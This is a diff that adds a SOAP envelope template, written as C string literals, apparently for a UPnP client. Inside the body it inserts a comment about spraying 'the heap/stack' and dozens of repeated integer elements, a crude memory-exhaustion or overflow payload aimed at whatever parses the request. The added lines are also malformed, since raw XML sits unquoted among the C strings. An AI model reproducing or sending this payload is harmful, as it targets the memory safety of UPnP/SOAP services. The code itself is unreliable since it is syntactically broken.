@@ -1,0 +1,42 @@
+"<?xml version=\"1.0\"?>\r\n"
+    "<" SOAPPREFIX ":Envelope "
+	    "xmlns:" SOAPPREFIX "=\"http://schemas.xmlsoap.org/soap/envelope/\" "
+	    SOAPPREFIX ":encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
+	"<" SOAPPREFIX ":Body>"
+	"<" SERVICEPREFIX ":%s xmlns:" SERVICEPREFIX "=\"%s\">"
+            <!--Assuming this is how is supposed to be an element in body, spray the heap/stack till we get on with it -->
+            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>            <x xsi:type="xsd:int">5</x>
+            <x xsi:type="xsd:int">5</x>
+
+    "</" SERVICEPREFIX ":%s>"
+	"</" SOAPPREFIX ":Body></" SOAPPREFIX ":Envelope>""\r\n"
